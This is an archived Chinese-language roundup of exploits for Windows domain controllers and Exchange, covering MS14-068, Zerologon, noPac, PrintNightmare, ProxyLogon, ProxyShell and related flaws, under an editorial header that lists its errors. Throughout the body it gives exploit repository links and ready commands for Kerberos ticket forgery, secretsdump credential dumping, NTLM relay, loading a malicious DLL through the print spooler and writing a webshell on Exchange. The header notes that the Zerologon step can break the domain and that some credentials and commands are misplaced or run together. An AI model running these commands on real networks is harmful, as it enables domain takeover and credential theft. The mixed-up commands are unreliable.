---
cve: "CVE-2014-6324;CVE-2020-1472;CVE-2021-42287;CVE-2021-42278;CVE-2019-1040;CVE-2018-8581;CVE-2020-0688;CVE-2021-1675;CVE-2021-26855;CVE-2021-27065;CVE-2020-17144;CVE-2020-16875;CVE-2021-34473;CVE-2021-33766"
identifier_role: "primary"
primary_identifiers: "CVE-2014-6324;CVE-2020-1472;CVE-2021-42287;CVE-2021-42278;CVE-2019-1040;CVE-2018-8581;CVE-2020-0688;CVE-2021-1675;CVE-2021-26855;CVE-2021-27065;CVE-2020-17144;CVE-2020-16875;CVE-2021-34473;CVE-2021-33766"
referenced_identifiers: ""
identifier_status: "unknown"
title: "Windows 域控常见 0day 及利用漏洞汇集"
product: "Windows AD/KDC/Netlogon/NTLM/Spooler 与 Microsoft Exchange"
record_type: "roundup"
document_type: "多漏洞/多工具汇编"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "各漏洞前提不同：域认证/可创建机器账号、RPC可达、NTLM relay条件、邮箱认证/角色等未系统区分；多数仅工具链接"
side_effects: "Zerologon步骤可能更改DC机器密码导致域故障，未说明副作用/恢复；不应作为安全检测步骤，当前未执行"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Windows/Windows%20%E5%9F%9F%E6%8E%A7%E5%B8%B8%E8%A7%81%200day%20%E5%8F%8A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%B1%87%E9%9B%86.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/Iex9QiyAWT9bdoAtsKgN-Q"
id: "vw-f5e9e410b7a795630685c391"
entity_id: "ve-f5e9e410b7a795630685c391"
schema_version: "1"
---

# Windows 域控常见 0day 及利用漏洞汇集

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Windows AD/KDC/Netlogon/NTLM/Spooler 与 Microsoft Exchange
- 文献类型：多漏洞/多工具汇编
- 版本、权限及部署边界：各漏洞前提不同：域认证/可创建机器账号、RPC可达、NTLM relay条件、邮箱认证/角色等未系统区分；多数仅工具链接
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. frontmatter只6324掩盖12个主题14个明示CVE，应拆成关联记录并保留汇编索引；这些历史已修漏洞不是当前0day
2. PrintNightmare1675/34527映射需核，ProxyShell仅34473不足表达多漏洞链；2018-8581段混入PrivExchange/Exchange2domain域提权与邮箱伪造需核编号边界
3. NTLM1040仅普通账号即可控域内任何机器过宽，缺认证强制/签名/绑定和权限条件；noPac缺机器账号创建额度及修复状态
4. Zerologon步骤可能更改DC机器密码导致域故障，未说明副作用/恢复；不应作为安全检测步骤，当前未执行
5. Exchange段secretsdump突然使用前段evil.local/Administrador示例，域与凭证错置；两条1040命令粘连、编号缺1.10
6. 各NVD及源码链接可作为索引但缺厂商补丁矩阵/固定提交，多处只有下载无技术结论；工具收费获取广告删除，图未视检

### 操作风险

Zerologon步骤可能更改DC机器密码导致域故障，未说明副作用/恢复；不应作为安全检测步骤，当前未执行

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/Iex9QiyAWT9bdoAtsKgN-Q>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://nvd.nist.gov/vuln/detail/CVE-2014-6324>
- 原文参考链接（未重新核验）：<https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068>
- 原文参考链接（未重新核验）：<https://github.com/Al1ex/WindowsElevation>
- 原文参考链接（未重新核验）：<https://www.secpulse.com/archives/2874.html>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Iex9QiyAWT9bdoAtsKgN-Q)

     本文对近几年出现的 Windows 域控相关漏洞及利用方法进行整理，方便检测存在的漏洞，目前来看主要集中在本地权限提升、打印机服务利用、exchange 等。     
=========================================================================================

![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KZZyChGsoAXo3BSEicb6QdBvrTib2dibL3V8We7eXeib3quoZZSPW9fzQ7A/640?wx_fmt=jpeg)

1.1Kerberos 校验和漏洞 MS14-068(CVE-2014-6324)
=========================================

  Microsoft Windows Server 2003 SP2、Windows Vista SP2、Windows Server 2008 SP2 和 R2 SP1、Windows 7 SP1、Windows 8、Windows 8.1 以及 Windows Server 2012 Gold 和 R2 中的 Kerberos 密钥分发中心 (KDC) 允许经过身份验证的远程域用户通过票证中的伪造签名获得域管理员权限，2014 年 11 月在野外被利用，又名 “Kerberos 校验和漏洞”。

更新漏洞信息可以访问 https://nvd.nist.gov/vuln/detail/CVE-2014-6324

EXP/POC:

https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

https://github.com/Al1ex/WindowsElevation

利用方法:

（1）域管理员: DCwin03 域名: demo.com 普通域用户: hx

（2）登录普通域用户 hx，cmd 中输入 "whoami/user" 获取 sid  
demo/hx S-1-5-21-3813283032-1038476579-1047458262-1110

（3）退出域用户 hx，登录本地用户 123

python ms14-068.py -u hx@demo.com -p pwd_of_hx -s S-1-5-21-3813283032-1038476579-1047458262-1110 -d DCwin03.demo.com

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7K6gTbFYgzkQ3ibtiavzicBCicQkMyCoUVJyu8gt0ia7cET3uCibvZKQaCtiaag/640?wx_fmt=png)

（4）获取管理员权限

c:\User\123>Mimikatz.exe "kerberos::ptc TGT_hx@demo.com.ccache" exit      

net use \\DCwin03\admin$  

dir \\DCwin03\c$

更多详细利用请参考文章：https://www.secpulse.com/archives/2874.html

1.2.Netlogon 特权提升漏洞 CVE-2020-1472
=================================

当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立易受攻击的 Netlogon 安全通道连接到域控制器时，存在特权提升漏洞，也称为 “Netlogon 特权提升漏洞”。

https://nvd.nist.gov/vuln/detail/CVE-2020-1472

EXP/POC:

https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472

配合工具：

https://github.com/fortra/impacket

https://github.com/maaaaz/impacket-examples-windows

详细利用方法：

python3 cve-2020-1472.py DC01 DC01$ 192.168.204.136

secretsdump.py evil.local/Administrador:BlackArrow123@192.168.204.136 -just-dc-user 'DC01$'  

更多利用信息可以参考

https://www.jianshu.com/p/32474b6bbf00

https://blog.csdn.net/include_voidmain/article/details/123256993

1.3.Windows 域服务权限提升漏洞 CVE-2021-42287&42278
==========================================

CVE-2021-42278 利用 AD 域计算机账户认证漏洞，使用计算机账户的 sAMAccountName 冒充域控制器，结合 CVE-2021-42287 可以获取 Kerberos 特权属性证书 (PAC)，从而使域内普通用户权限提升至域管理员权限。

影响系统版本：

Windows Server 2008 for x64-based Systems Service Pack 2

Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)

Windows Server 2008 R2 for x64-based Systems Service Pack 1

Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)

Windows Server 2008 for 32-bit Systems Service Pack 2

Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)

Windows Server 2012

Windows Server 2012 (Server Core installation)

Windows Server 2012 R2

Windows Server 2012 R2 (Server Core installation)

Windows Server 2016

Windows Server 2016 (Server Core installation)

Windows Server, version 20H2 (Server Core Installation)

Windows Server, version 2004 (Server Core installation)

Windows Server 2019

Windows Server 2019 (Server Core installation)

Windows Server 2022

Windows Server 2022 (Server Core installation)

https://nvd.nist.gov/vuln/detail/CVE-2021-42287

https://nvd.nist.gov/vuln/detail/CVE-2021-42278

EXP/POC:

https://github.com/WazeHell/sam-the-admin

https://github.com/cube0x0/noPac

实验环境：

域控制器及域信息:

OS: Microsoft Windows Server 2016 Datacenter

Hostname: DC01

IP: 192.168.43.100

Domain: main.test.com

NetBIOS Domain Name: MAIN

已知域用户: testuser，密码: p@55word

1.sam-the-admin.py

工具链接：https://github.com/WazeHell/sam-the-admin

python3 sam_the_admin.py "main/testuser:p@55word" -dc-ip 192.168.43.100 -shell

注意获取 shell 是通过 impacket 包中的 smbexec.py，获取 HASH 是通过 impacket 包中的 secretsdump.py，在 sam-the-admin.py 中有如下定义：

fbinary = "/usr/bin/impacket-smbexec"

if options.dump:

   fbinary = "/usr/bin/impacket-secretsdump"

2.noPac.py 利用

在 sam-the-admin.py 的基础上改进，工具链接：https://github.com/Ridter/noPac

（1）获取 shell

python3 noPac.py -use-ldap main.test.com/testuser:p@55word -dc-ip 192.168.43.100 -shell

（2）获取 HASH

python3 noPac.py -use-ldap main.test.com/testuser:p@55word -dc-ip 192.168.43.100 -dump -just-dc-ntlm

（3）认证方式支持 HASH 传递

python3 noPac.py -use-ldap main.test.com/testuser -hashes :52888cf384b8d2e56e0cc2bb6b906f99 -dc-ip 192.168.43.100 -dump -just-dc-ntlm

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KIznbPYlpaLILic1eDdOicra9rmib9ITHicBKOFw8P052xXtuCicvJmAeibOA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KIAKZgP5wu2Bo8m0vgKAibob8cLer7KmqaW56OY5Fzbg1OoU5BrMK5DQ/640?wx_fmt=png)

参考文章：

https://blog.csdn.net/Captain_RB/article/details/125569452

1.4Microsoft Windows NTLM 认证漏洞 CVE-2019-1040
============================================

2019 年 6 月，Microsoft 发布了一条安全更新。该更新针对 CVE-2019-1040 漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过 NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器

https://nvd.nist.gov/vuln/detail/CVE-2019-1040

https://paper.seebug.org/962/

EXP/POC:

https://github.com/Ridter/CVE-2019-1040

1. 利用方法

python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip

![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KyJ4DNelHibiax5KMIJwkh7uYUw1ut0NotkwVOeAqAZnIpgTrCia3gZKUw/640?wx_fmt=jpeg)

1.5Microsoft Exchange 任意用户伪造漏洞 CVE-2018-8581
============================================

这是一个邮箱层面的横向渗透和提权漏洞，它可以在拥有了一个普通权限邮箱账号密码后，完成对其他用户 (包括域管理员) 邮箱收件箱的委托接管。

https://nvd.nist.gov/vuln/detail/CVE-2018-8581

EXP/POC:

https://github.com/Ridter/Exchange2domain

https://github.com/WyAtu/CVE-2018-8581

测试环境：

DC Windows 2012 (192.168.52.3/ad01.qfdomain.com)

Exchange 2013 Windows 2012 （192.168.52.4/mail.qfdomain.com）

Attack Parrot (192.168.52.101)

（1）利用方式 1

python Exchange2domain.py -ah attackterip   -ap listenport -u user -p password -d domain.com -th DCip MailServerip  

python Exchange2domain.py -ah 192.168.52.101 -ap 80 -u attack -p "attack" -d qfdomain.com -th 192.168.52.3  192.168.52.4 --no-ssl

（2）利用方式 2

开启反射监听

python2 ntlmrelayx.py -t ldap://192.168.52.3 --escalate-user attack

漏洞利用

python2 privexchange.py -ah 192.168.52.101 mail.qfdomain.com -u attack -p "attack" -d qfdomain.com --no-ssl --debug

获取 hash

secretsdump.py evil.local/Administrador:BlackArrow123@192.168.52.3 -just-dc  

  
1.6Microsoft Exchange 反序列化 RCE（CVE-2020-0688）
================================================

https://nvd.nist.gov/vuln/detail/CVE-2020-0688

EXP/POC:

https://github.com/zcgonvh/CVE-2020-0688

1.7Windows Print Spooler 权限提升漏洞 CVE-2021-1675
=============================================

 该漏洞又被漏洞的作者称为 PrintNightmare，引发该漏洞的原因主要是因为当 Windows Print Spooler 服务（Windows 的打印机后台处理程序）不正确地执行特权文件操作时，存在远程执行代码漏洞风险。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新账户。攻击者可以通过该漏洞绕过 PfcAddPrinterDriver 的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到 DC 中的 Spooler 服务，并利用该漏洞在 DC 中安装恶意的驱动程序，完整的控制整个域环境。

https://nvd.nist.gov/vuln/detail/CVE-2021-1675

EXP/POC:

https://github.com/cube0x0/CVE-2021-1675

https://github.com/calebstewart/CVE-2021-1675

https://github.com/numanturle/PrintNightmare

.\PrintNightmare.exe 192.168.5.129 \\192.168.5.197\test\MyExploit.dll user2 test123##

Import-Module .\cve-2021-1675.ps1

Invoke-Nightmare -DriverName "PrintTest" -NewUser "FakeZeeker" -NewPassword "123"

### CVE-2021-1675.py

usage:

CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share CVE-2021-1675 implementation. positional arguments:   target                `[[domain/]username[:password]@]<targetName or address>`   share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll' optional arguments:   -h, --help            show this help message and exit authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH connection:   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name                         and you cannot resolve it   -port [destination port]                         Destination port to connect to SMB Server Example; ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'  

1.8Exchange ProxyLogon 远程代码执行漏洞 CVE-2021-26855/CVE-2021-27065
=============================================================

https://nvd.nist.gov/vuln/detail/CVE-2021-26855

https://nvd.nist.gov/vuln/detail/CVE-2021-27065

EXP/POC:

https://github.com/hausec/ProxyLogon

python proxylogon.py primary administrator@lab.local

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KehLcWozq1rIrOHxOyB70PRT1vFLaUWJnNZTVNA9oBNs1RZvhibMSe3g/640?wx_fmt=png)

1.9Microsoft Exchange 远程代码执行漏洞 CVE-2020-17144
=============================================

     在微软最新发布的 12 月安全更新中公布了一个存在于 Microsoft Exchange Server2010 中的远程代码执行漏洞（CVE-2020-17144），官方定级 Important。漏洞是由程序未正确校验 cmdlet 参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。

原文链接：https://blog.csdn.net/m0_48520508/article/details/111934211

https://nvd.nist.gov/vuln/detail/CVE-2020-17144

EXP/POC:

https://github.com/Airboi/CVE-2020-17144-EXP

条件: Exchange2010;

普通用户 默认用法 (写 webshell):

CVE-2020-17144-EXP.exe mail.example.com user pass

1.11Microsoft Exchange 远程代码执行漏洞 CVE-2020-16875
==============================================

https://nvd.nist.gov/vuln/detail/CVE-2020-16875

EXP/POC:

https://srcincite.io/pocs/cve-2020-16875.py.txt

1.12Exchange ProxyShell SSRF（CVE-2021-34473）
============================================

https://nvd.nist.gov/vuln/detail/CVE-2021-34473

EXP/POC:

https://github.com/dmaasland/proxyshell-poc

利用方法：

python3.8 proxyshell_rce.py -u exchange.lab.local -e labadmin@lab.local

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KjbgANE5umACg99ozMDiar87QaHrDLKnKR7BRrAgvAoIn2HsKYxnC3XQ/640?wx_fmt=png)

1.13Exchange ProxyToken 信息泄露漏洞 CVE-2021-33766
=============================================

研究人员发现 Microsoft Exchange 服务器中存在 ProxyToken 漏洞——CVE-2021-33766。攻击者只需要伪造一个到 Exchange Control Panel (ECP) 应用中的 web 服务器的请求就可以在无需认证从受害者收件箱中窃取邮件信息。

https://nvd.nist.gov/vuln/detail/CVE-2021-33766

![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KjbgANE5umACg99ozMDiar87QaHrDLKnKR7BRrAgvAoIn2HsKYxnC3XQ/640?wx_fmt=png)

EXP/POC:

https://github.com/bhdresh/CVE-2021-33766-ProxyToken

`./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>`

     本文所有工具已经下载到本地，请关注本公众号并添加微信号：lovesec2022 获取。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
